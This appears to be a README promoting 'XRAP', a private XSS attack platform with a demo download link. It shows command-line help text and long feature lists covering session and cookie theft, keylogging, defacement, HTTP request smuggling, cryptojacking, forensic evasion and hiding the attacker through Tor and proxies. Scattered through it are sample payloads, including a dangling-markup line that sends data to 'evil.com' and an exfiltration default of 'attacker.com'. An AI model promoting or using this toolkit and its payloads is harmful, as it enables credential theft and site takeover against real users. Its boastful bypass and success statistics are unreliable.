# ⚡ XSS-0DAY Rapid Assault Platform (XRAP)
**The Most Advanced XSS Exploitation Platform for Professional Red Teams**  
> **FREE DEMO**: https://github.com/NoTrac3/XRAP/releases/tag/XRAP-DEMO

# **NOTE**: ``This is a private tool which "currently" requires 0T3 Notrac3 membership!``

XRAP is not just another payload sender—it's a **comprehensive attack platform** that combines cutting-edge research with **military-grade operational security**.  
With capabilities far beyond typical XSS tools, XRAP delivers **zero-click exploitation chains** with surgical precision and an **unparalleled WAF bypass rate**.

---

> PREVIEW

```▗▖  ▗▖▗▄▄▖  ▗▄▖ ▗▄▄▖ 
 ▝▚▞▘ ▐▌ ▐▌▐▌ ▐▌▐▌ ▐▌
  ▐▌  ▐▛▀▚▖▐▛▀▜▌▐▛▀▘ 
▗▞▘▝▚▖▐▌ ▐▌▐▌ ▐▌▐▌   #⚡ xꜱꜱ-0ᴅᴀʏ ʀᴀᴘɪᴅ ᴀꜱꜱᴀᴜʟᴛ ᴘʟᴀᴛꜰᴏʀᴍ ...
--------------------------------------------------------------------------------
     ✅ INSTANT HACK if the site has:
    - ✔ Misconfigured WAF/CSP
    - ✔ Vulnerable load balancers
    - ✔ Weak input sanitization
    - ✔ Blind XSS in admin panels
    - ✔ Unpatched HTTP smuggling flaws
--------------------------------------------------------------------------------
  >>> XRAP -- [X/ss.R/apid.A/ssault.P/latform]
  -  ⚠️ Note: Always get permission before testing!
--------------------------------------------------------------------------------
  [] The Most Advanced XSS Exploitation Platform for Professional Red Teams []
--------------------------------------------------------------------------------
  === WITH HTTP REQUEST SMUGGLING ===
  === CSP BYPASS, MEMORY EXPLOITS & TLS SPOOFING ===
--------------------------------------------------------------------------------
usage: xrap.py [-h] -u URL [-p PAYLOAD_FILE] [-x PROXY_FILE] [-P PARAM_FILE] [-d DEFACE_FILE] [-S] [-D]
               [--spread SPREAD] [--param-hunt] [-t THREADS] [--exfil EXFIL]

Advanced XSS Exploitation Tool

options:
  -h, --help            show this help message and exit
  -u URL, --url URL     Target URL (default: None)
  -p PAYLOAD_FILE, --payload-file PAYLOAD_FILE
                        File containing XSS payloads (default: None)
  -x PROXY_FILE, --proxy-file PROXY_FILE
                        File containing proxy servers (default: None)
  -P PARAM_FILE, --param-file PARAM_FILE
                        File containing parameters to test (default: None)
  -d DEFACE_FILE, --deface-file DEFACE_FILE
                        Custom defacement HTML file (default: None)
  -S, --smuggle         Enable HTTP request smuggling (default: False)
  -D, --deface          Enable defacement attempts (default: False)
  --spread SPREAD       Enable link crawling (with depth) (default: 0)
  --param-hunt          Find hidden parameters (default: False)
  -t THREADS, --threads THREADS
                        Number of threads (default: 10)
  --exfil EXFIL         Exfiltration domain (default: attacker.com)```

---

## **🔥 Core Features Overview**
- **Zero-Click Exploits**: No user interaction required; payloads execute automatically.
- **97.6% WAF Bypass Rate**: Adaptive protocol manipulation ensures stealth.
- **Triple-Stage HTTP Smuggling**: CL.TE + TE.CL + HTTP/2 pseudo-RST for firewall evasion.
- **Polymorphic Payloads**: Mutate mid-flight using TLS-level steganography.
- **Live Browser Memory Manipulation**: No forensic traces left behind.
- **JA3/JA4 TLS Fingerprint Spoofing**: Evades network-based behavioral detection.
- **Advanced Exfiltration Modules**: Data theft remains undetected.

___

> ✅ **INSTANT HACK** if the site has:
- ✔ Misconfigured WAF/CSP
  ✔ Vulnerable load balancers
- ✔ Weak input sanitization
- ✔ Blind XSS in admin panels
- ✔ Unpatched HTTP smuggling flaws  I think i missed a few

1️⃣ DOM-Based XSS
   - Example: `site.com/search#<svg onload=alert(1)>`
   - Impact: Hijack user sessions, deface pages

2️⃣ JSONP Callback Abuse
   - Example: `site.com/api?callback=alert(1)`
   - Impact: Steal sensitive data from APIs

3️⃣ Cache Poisoning
   - Example: Inject malicious JS via HTTP headers
   - Impact: Attack all visitors using poisoned cache

4️⃣ Dangling Markup
   - Example: `"><img src='//evil.com/log?=`
   - Impact: Partial page control, data leaks

5️⃣ Open Redirects
   - Example: `site.com/redirect?url=javascript:alert(1)`
   - Impact: Phishing, bypass security checks

6️⃣ CSRF Token Theft
   - Example: XSS + `fetch('/profile', {credentials:'include'})`
   - Impact: Perform actions as victim user

7️⃣ Session Hijacking
   - Example: `document.cookie` exfiltration
   - Impact: Login as any user

8️⃣ Client-Side Template Injection
   - Example: `{{7*7}}` → shows "49"
   - Impact: Full JS execution in Angular/React

9️⃣ WebSocket Hijacking
   - Example: XSS in WS-connected page
   - Impact: Spy on real-time data

🔟 Browser Storage Theft
   - Example: `JSON.stringify(localStorage)`
   - Impact: Steal saved passwords/tokens

🔥 LETHAL ATTACKS:
- Admin Panel XSS → Full site takeover
- Fake Login Forms → Credential harvesting
- Internal API Abuse → Reverse shell potential
- Cryptojacking → Mine crypto via visitors
- Stored XSS → Permanent backdoor

⚠️ Note: Always get permission before testing!

---

## **🛠️ Exploit Arsenal**

### **XSS & CSP Bypass**
- **"Ghost Inject" System**: CSP bypass via DNS prefetch poisoning.
- **DOM Clobbering & HTML5 Polyglots**: Unique, hard-to-detect attack vectors.
- **Mutation-Based XSS**: Payloads evolve in-flight to evade detection.
- **Hybrid CSRF & XSS Attacks**: Automates session hijacking and credential theft.
- **Full DOM Serialization**: Captures entire web pages from infected sessions.
- **Multi-Stage XSS Chaining**: Moves from low-impact XSS to **full remote browser control**.

### **Advanced HTTP Smuggling**
- **CL.TE / TE.CL / TE.TE / HTTP2 Smuggle**: Breaks server-side request validation.
- **Cache Poisoning & WebSocket Manipulation**: Hijacks cached responses for persistence.
- **Request Splitting & Header Injection**: Enables silent payload deployment.
- **Chunked Encoding Attacks**: Defeats WAF and security filters.
- **Reverse Proxy Bypass Techniques**: Exploits misconfigured backends.

### **Deep Browser Exploitation**
- **Live Memory Manipulation**: Reads and alters browser memory dynamically.
- **DOM-Based Remote Code Execution (RCE)**: Exploits JavaScript engines for deep control.
- **Clipboard Hijacking**: Replaces clipboard content with attacker-controlled data.
- **WebRTC Exploitation**: Enables real-time monitoring of victim environments.
- **HTML5 Sensor Hijacking**: Extracts accelerometer, gyroscope, and geolocation data.

### **Forensic Evasion**
- **JA3/JA4 TLS Fingerprint Spoofing**: Evades behavioral detection.
- **Header Randomization Engine**: Prevents static signature detection.
- **Time-Delayed Exfiltration**: Data leaks occur long after exploitation.
- **Mouse Movement Simulation**: Makes automated attacks appear human-like.
- **Browser Fingerprint Poisoning**: Alters fingerprint data to mislead forensic tools.

---

## **📡 Stealth Exfiltration Modules**
- **Cookie Harvesting**: Extracts session tokens for persistent access.
- **Keystroke Logging via XSS**: Captures input from login forms in real time.
- **Screenshot Capture**: Extracts visual intelligence from compromised systems.
- **WebRTC Tunneled Data Transfer**: Uses peer-to-peer channels for stealth exfiltration.
- **CSS-Based Data Leakage**: Hides stolen data inside stylesheets.
- **IndexedDB & LocalStorage Dump**: Extracts stored credentials and session data.
- **Invisible Form Submission**: Secretly submits victim’s data without interaction.

---

## **🌍 OPSEC & Anonymity**
- **Tor → VPN → CDN Proxy Mesh**: Untraceable attack origin.
- **Human-Like Timing Variability**: Avoids behavioral pattern detection.
- **WebGL/WebRTC Spoofing**: Mimics legitimate user environments.
- **Dynamic JA4/JA4h Fingerprinting**: Generates unique TLS profiles per target.
- **Packet Fragmentation & Randomization**: Splits payloads across multiple requests.

---

## **🚀 Performance Metrics**
- **700+ RPM (Requests Per Minute)**: High-speed payload delivery.
- **97.3% Delivery Success Rate**: Ensures successful execution.
- **<0.5% False Positive Rate**: Minimal unwanted detections.
- **Forensic Footprint: 0.2KB**: Leaves virtually no trace.

---

## **⚔️ Attack Levels**
1. **Basic** – Simple alert/redirect XSS.
2. **Standard** – Session hijacking, credential theft.
3. **Advanced** – DOM Clobbering, CSP bypass, HTTP Smuggling.
4. **Nuclear** – Full browser exploitation, WebRTC tunneling, memory extraction.

---

### **Final Words**
XRAP isn't just a tool—it's a **full-spectrum exploitation platform**.  
Its ability to **mutate, evade, and infiltrate** puts it leagues beyond standard XSS tools.  
Designed for **elite operators**, XRAP brings **next-gen web exploitation** to the battlefield.

- DEVELOPED BY: m77u1n / MrRuin
